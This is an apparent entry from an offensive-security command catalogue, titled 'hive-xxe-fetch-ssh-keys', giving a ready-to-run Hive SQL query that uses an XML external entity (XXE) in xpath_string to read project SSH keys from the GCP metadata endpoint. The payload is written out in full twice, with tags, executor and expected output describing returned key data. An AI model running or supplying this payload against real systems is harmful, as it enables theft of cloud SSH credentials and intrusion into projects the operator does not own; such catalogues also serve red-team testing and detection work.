---
id: uuid-c5
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - ssh
type: command
output: List of redacted SSH keys (multiple lines)
executor: sql
platforms:
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.603Z'
verified: false
validated: true
submitted: true
---
# hive-xxe-fetch-ssh-keys

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Uses XXE to retrieve SSH keys from GCP project metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SYSTEM | SSH keys endpoint | Yes |
| LIMIT 5 | Result limit | Yes |

## Examples

### Basic Usage

```sql
select xpath_string(...) FROM test LIMIT 5;
```

## Expected Output

Multiple lines of SSH key data.

## Related

- [[Related Procedure: Fetch-SSH-Keys-and-Metadata-via-XXE]]
